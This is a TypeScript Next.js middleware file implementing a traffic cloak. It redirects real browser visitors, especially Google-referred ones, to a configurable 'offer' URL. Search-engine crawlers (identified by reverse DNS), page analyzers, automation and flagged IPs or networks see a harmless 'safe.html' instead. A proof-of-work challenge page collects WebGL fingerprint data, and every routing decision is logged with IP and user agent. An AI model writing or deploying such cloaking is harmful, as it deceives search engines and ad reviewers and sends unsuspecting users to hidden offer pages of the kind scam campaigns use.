import { NextRequest, NextResponse, userAgent } from 'next/server'
import { get as edgeGet } from '@vercel/edge-config'
import { getOfferUrlRuntime } from './utils/config'
import {
  getIP,
  hasHumanActivity,
  isBanned,
  isBlacklistedASN,
  isBlacklistedIP,
  isBlockedUserAgent,
  isStaticAssetPath,
  reversePTRMatches,
  fingerprintValid,
  getASN,
  isAnalyzerRequest,
  isLikelyBrowserAutomation,
  isTrustedGoogleRef,
  isBot as isBotAdvanced,
} from './utils/botCheck'
import { signPayload } from './utils/nonce'
import { getExperimentConfig } from './utils/experiments'

async function logDecision(req: NextRequest, decision: 'offer' | 'safe' | 'challenge' | 'bypass', reasons: string[], score?: number) {
  try {
    const origin = req.nextUrl.origin
    const logsToken = (await edgeGet('LOGS_API_TOKEN')) || (process.env as any)?.LOGS_API_TOKEN
    const sid = req.cookies.get('human_signed')?.value || null
    const payload = {
      ts: Date.now(),
      path: req.nextUrl.pathname,
      ip: getIP(req),
      ua: req.headers.get('user-agent') || '',
      asn: getASN(req),
      country: (req as any)?.cf?.country || req.geo?.country || req.headers.get('cf-ipcountry') || null,
      decision,
      reasons,
      score: score ?? null,
      sidPrefix: sid ? String(sid).slice(0, 32) : null,
    }
    // Fire-and-forget; don't block middleware
    fetch(`${origin}/api/logs`, {
      method: 'POST',
      headers: {
        'content-type': 'application/json',
        ...(logsToken ? { Authorization: `Bearer ${logsToken}` } : {}),
      },
      body: JSON.stringify(payload),
      // keepalive hints the platform to allow it after response
      keepalive: true as any,
    }).catch(() => {})
  } catch {
    // ignore logging errors
  }
}

export async function middleware(req: NextRequest) {
  const { pathname } = req.nextUrl

  // Edge Config connectivity demo: respond on /welcome with value from store
  if (pathname === '/welcome') {
    try {
      const greeting = await edgeGet('greeting')
      return NextResponse.json(greeting as any)
    } catch {
      return NextResponse.json({ error: 'edge-config-unavailable' }, { status: 500 })
    }
  }

  const makeRewrite = (path: string, decision: 'offer'|'safe'|'bypass'|'challenge', reasons: string[]) => {
    const res = NextResponse.rewrite(new URL(path, req.url))
    res.headers.set('x-cloak-decision', decision)
    if (reasons.length) res.headers.set('x-cloak-reasons', reasons.join(','))
    res.headers.set('cache-control', 'private, no-store')
    return res
  }

  const makeRedirect = (url: string, reasons: string[]) => {
    const res = NextResponse.redirect(url)
    res.headers.set('x-cloak-decision', 'offer')
    if (reasons.length) res.headers.set('x-cloak-reasons', reasons.join(','))
    res.headers.set('cache-control', 'private, no-store')
    return res
  }

  // Activation gate: resolve offer URL (Edge Config or env). If absent, Safe Mode.
  const OFFER_URL = await getOfferUrlRuntime()
  if (!OFFER_URL) {
    // Allow assets, _next, api, and safe.html itself
    if (
      pathname.startsWith('/_next') ||
      pathname.startsWith('/api/') ||
      pathname === '/safe.html' ||
      isStaticAssetPath(pathname)
    ) {
      await logDecision(req, 'bypass', ['inactive:env-missing'])
      const res = NextResponse.next()
      res.headers.set('x-cloak-decision', 'bypass')
      res.headers.set('x-cloak-reasons', 'inactive:env-missing')
      return res
    }
    await logDecision(req, 'safe', ['inactive:env-missing'])
    return makeRewrite('/safe.html', 'safe', ['inactive:env-missing'])
  }

  // Allow these paths to pass through without cloaking
  if (
    pathname.startsWith('/_next') ||
    pathname.startsWith('/api/') ||
    pathname === '/hc' ||
    pathname === '/safe.html' ||
    pathname === '/offer.html' ||
    isStaticAssetPath(pathname)
  ) {
    await logDecision(req, 'bypass', ['matcher:excluded'])
    const res = NextResponse.next()
    res.headers.set('x-cloak-decision', 'bypass')
    res.headers.set('x-cloak-reasons', 'matcher:excluded')
    return res
  }

  // Early allow: if we already have a valid signed human cookie (js challenge solved),
  // prefer sending to offer directly for performance. Full verification happens in API.
  const humanSigned = req.cookies.get('human_signed')?.value
  if (humanSigned) {
    await logDecision(req, 'offer', ['session:signed'])
    const OFFER_URL2 = await getOfferUrlRuntime()
    if (OFFER_URL2) return NextResponse.redirect(OFFER_URL2)
    return NextResponse.rewrite(new URL('/offer.html', req.url))
  }

  // Allowlist: real browser traffic coming from Google search results
  if (isTrustedGoogleRef(req)) {
    await logDecision(req, 'offer', ['allow:google-ref'])
    if (OFFER_URL) return makeRedirect(OFFER_URL, ['allow:google-ref'])
    return makeRewrite('/offer.html', 'offer', ['allow:google-ref'])
  }

  // Hard bans (skip for Google-ref allowlisted traffic)
  if (isBanned(req)) {
    await logDecision(req, 'safe', ['cookie:ban'])
    return makeRewrite('/safe.html', 'safe', ['cookie:ban'])
  }

  const uaStr = req.headers.get('user-agent')
  const { isBot: uaBot } = (() => {
    const r = isBlockedUserAgent(uaStr)
    return { isBot: r.blocked }
  })()
  if (uaBot) {
    await logDecision(req, 'safe', ['ua:blocklist'])
    return makeRewrite('/safe.html', 'safe', ['ua:blocklist'])
  }

  // Block common performance analyzers (PageSpeed/Lighthouse/etc.)
  if (isAnalyzerRequest(req)) {
    await logDecision(req, 'safe', ['analyzer:detected'])
    return makeRewrite('/safe.html', 'safe', ['analyzer:detected'])
  }

  // Block likely browser automation even with generic UA
  const auto = isLikelyBrowserAutomation(req)
  if (auto.flag) {
    await logDecision(req, 'safe', ['automation:suspect', ...auto.reasons])
    return makeRewrite('/safe.html', 'safe', ['automation:suspect', ...auto.reasons])
  }

  const ip = getIP(req)
  if (isBlacklistedIP(ip)) {
    await logDecision(req, 'safe', ['ip:blacklist'])
    return makeRewrite('/safe.html', 'safe', ['ip:blacklist'])
  }

  const asn = getASN(req)
  if (isBlacklistedASN(asn as any)) {
    await logDecision(req, 'safe', ['asn:blacklist'])
    return makeRewrite('/safe.html', 'safe', ['asn:blacklist'])
  }

  // Reverse DNS PTR for known crawler domains
  const isPtrBot = await reversePTRMatches(ip, [
    /\.googlebot\.com\.?$/i,
    /\.search\.msn\.com\.?$/i,
    /\.crawl\.yahoo\.net\.?$/i,
    /\.baidu\.com\.?$/i,
    /\.yandex\.ru\.?$/i,
    /\.facebook\.com\.?$/i,
  ])
  if (isPtrBot) {
    await logDecision(req, 'safe', ['ptr:bot'])
    return makeRewrite('/safe.html', 'safe', ['ptr:bot'])
  }

  // Advanced ensemble scoring and challenge
  const adv = await isBotAdvanced(req)
  const ipUntrusted = (await import('./utils/botCheck')).isIpFromUntrustedSource(req)
  const seed = `${getIP(req) || 'noip'}:${req.headers.get('user-agent') || ''}`
  const exp = await getExperimentConfig(seed)
  const baseT = exp.botThreshold
  const strictT = exp.botThresholdStrict
  const reasonsAdv = [`p=${adv.score.toFixed(2)}`, `exp:${exp.variant}`, ...adv.reasons]

  if (adv.bot || adv.score >= strictT) {
    await logDecision(req, 'safe', ['adv:strict', ...reasonsAdv], Math.round(adv.score * 100))
    return makeRewrite('/safe.html', 'safe', ['adv:strict', ...reasonsAdv])
  }

  if (adv.score >= baseT && adv.score < strictT || (ipUntrusted && adv.score >= baseT - 0.05)) {
    // Medium risk: issue a lightweight JS+PoW challenge with a signed nonce bound to IP CIDR
    const ip = getIP(req)
    const fp = req.cookies.get('fp')?.value || 'nofp'
    const cidr = (ip && ip.split('.').slice(0, 3).join('.') + '.0/24') || '0.0.0.0/24'
    // Provider + TLS signature (when available) for stronger binding
    const provider = ((): 'cloudflare'|'vercel'|'unknown' => {
      if ((req as any)?.cf) return 'cloudflare'
      if ((req as any)?.geo || req.headers.get('x-vercel-id')) return 'vercel'
      return 'unknown'
    })()
    const tlsSig = ((): string | null => {
      const cf: any = (req as any)?.cf
      if (cf && (cf.tlsCipher || cf.tlsVersion)) return `${cf.tlsCipher || 'nc'}-${cf.tlsVersion || 'nv'}`.slice(0,64)
      return null
    })()
    const payload = JSON.stringify({ exp: Date.now() + 2 * 60 * 1000, ip_cidr: cidr, fpHash: fp.slice(0, 64), provider, tlsSig, expVariant: exp.variant })
    const token = await signPayload(payload)
    const html = `<!doctype html><html><head><meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1"><title>Verifying…</title></head><body>
    <main style=\"display:grid;place-items:center;min-height:100dvh;font-family:system-ui,sans-serif\">
      <div style=\"text-align:center\">
        <h1>Additional verification…</h1>
        <p>Running a quick check to confirm you are human.</p>
        <p id=\"s\"></p>
      </div>
    </main>
    <script>
      (async function(){
        const token = ${JSON.stringify(token)}
        const enc = new TextEncoder()
        // simple PoW: find n so that first 2 bytes of SHA-256(token+n) are zero
        let n = 0; let ok=false; let hHex='';
        function hex(buf){return Array.from(new Uint8Array(buf)).map(x=>x.toString(16).padStart(2,'0')).join('')}
        while(!ok && n < 200000){
          const d = enc.encode(token + String(n))
          const h = await crypto.subtle.digest('SHA-256', d)
          const b = new Uint8Array(h)
          if (b[0]===0 && b[1]===0){ ok=true; hHex=hex(h); break }
          n++
        }
        const glInfo = (function(){try{const c=document.createElement('canvas');const gl=c.getContext('webgl')||c.getContext('experimental-webgl'); if(!gl) return 'nogl'; const dbg=gl.getExtension('WEBGL_debug_renderer_info'); const v=dbg?gl.getParameter(dbg.UNMASKED_VENDOR_WEBGL):'unk'; const r=dbg?gl.getParameter(dbg.UNMASKED_RENDERER_WEBGL):'unk'; return (v+'|'+r).slice(0,128)}catch(e){return 'err'}})();
        const m = document.cookie.match(/(?:^|; )fp=([^;]+)/); const fp = m?decodeURIComponent(m[1]):'';
        const body = { token, solution: String(n), webgl: glInfo, fpHash: fp }
        const res = await fetch('/api/verify-challenge', { method:'POST', headers:{'content-type':'application/json'}, body: JSON.stringify(body), credentials: 'include' })
        const js = await res.json().catch(()=>({ok:false}))
        document.getElementById('s').textContent = js && js.ok ? 'Verified. Redirecting…' : 'Verification failed.'
        if (js && js.ok) setTimeout(()=>location.replace('/'), 150)
        else setTimeout(()=>location.replace('/safe.html'), 400)
      })();
    </script>
    </body></html>`
    await logDecision(req, 'challenge', ['adv:medium', ...reasonsAdv], Math.round(adv.score * 100))
    return new NextResponse(html, { headers: { 'content-type': 'text/html; charset=utf-8', 'cache-control': 'private, no-store' } })
  }

  // Low risk: send to offer
  await logDecision(req, 'offer', ['adv:low', ...reasonsAdv], Math.round(adv.score * 100))
  if (OFFER_URL) return makeRedirect(OFFER_URL, ['adv:low', ...reasonsAdv])
  return makeRewrite('/offer.html', 'offer', ['adv:low', ...reasonsAdv])
}

export const config = {
  matcher: ['/((?!_next|api|.*\\.(?:png|jpg|jpeg|gif|svg|ico|css|js|map|txt|webp|woff2?|ttf|eot)).*)'],
}
